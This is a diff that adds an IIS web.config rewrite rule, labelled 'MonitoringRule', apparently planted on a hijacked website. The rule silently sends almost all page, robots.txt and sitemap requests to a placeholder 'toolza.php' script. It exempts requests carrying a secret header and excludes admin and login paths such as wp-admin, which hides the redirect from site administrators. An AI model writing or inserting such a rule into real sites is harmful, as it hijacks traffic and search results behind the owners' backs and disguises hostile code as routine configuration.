@@ -1,0 +1,16 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<configuration>
+   <system.webServer>
+       <rewrite>
+			<rule name="MonitoringRule" stopProcessing="true">
+			   <match url="^.*$" ignoreCase="false" />
+			   <conditions logicalGrouping="MatchAll">
+					<add input="{HTTP_MONITORENGINE}" pattern="^turns$" ignoreCase="false" negate="true" />
+					<add input="{URL}" pattern="^.*((\.(php|html|htm|php4|php5))|robots.txt|sitemap.xml|sitemap_[0-9]{1,2}.xml)$|^[^\.]*$" ignoreCase="false" />
+					<add input="{URL}" pattern="(^.*((/(bitrix|administrator|yandex_market|admin|wp-admin|wp-login|manager|simpla|netcat|login|1c_exchange.php|django.wsgi|phpshop|admpanel))).*)" ignoreCase="false" negate="true" />
+			   </conditions>
+			   <action type="Rewrite" url="#path_to_toolza#/toolza.php" />
+		   </rule>
+       </rewrite>
+   </system.webServer>
+</configuration>
